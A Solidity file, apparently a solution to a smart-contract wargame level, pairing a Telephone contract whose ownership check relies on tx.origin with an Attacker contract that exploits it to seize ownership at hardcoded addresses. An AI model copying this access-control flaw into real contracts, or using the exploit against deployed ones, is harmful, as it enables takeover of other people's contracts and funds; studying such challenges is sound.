// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

// call this to change owner
contract Attacker {
    Telephone tel = Telephone(0xE8a842Ab70dA702b5fc65Ef18Eca29d71E60fE75);

    function attack() external {
        tel.changeOwner(0x69272551Ae1Afb5bb612C776BB907946705164BA);
    }
}
